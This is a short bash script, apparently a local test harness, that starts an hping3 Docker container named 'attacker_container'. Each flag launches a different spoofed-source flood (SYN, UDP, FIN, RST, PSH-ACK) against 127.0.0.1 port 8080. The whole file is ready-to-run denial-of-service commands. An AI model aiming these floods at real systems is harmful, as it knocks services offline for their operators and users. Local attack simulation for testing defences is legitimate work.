#!/bin/bash

docker rm attacker_container
case "$1" in
    -h)
        docker run --name attacker_container sflow/hping3:latest --rand-source -R '127.0.0.1' -p "8080"
        exit 1
        ;;
    -ts)
        docker run --name attacker_container sflow/hping3:latest --rand-source -S -q -n --flood '127.0.0.1' -p "8080"
        exit 1
        ;;
    -u)
        docker run --name attacker_container sflow/hping3:latest --rand-source --udp --flood '127.0.0.1' -p "8080"
        exit 1
        ;;
    -tf)
        docker run --name attacker_container sflow/hping3:latest --rand-source -F --flood '127.0.0.1' -p "8080"
        exit 1
        ;;
    -tr)
        docker run --name attacker_container sflow/hping3:latest --rand-source -R --flood '127.0.0.1' -p "8080"
        exit 1
        ;;
    -p)
        docker run --name attacker_container sflow/hping3:latest --rand-source -PA --flood '127.0.0.1' -p "8080"
        exit 1
        ;;
    -i)
        docker run --name attacker_container sflow/hping3:latest --rand-source -R '127.0.0.1' -p "8080"
        exit 1
        ;;
    *)
        echo "Unknown option: $1"
        exit 1
        ;;
esac
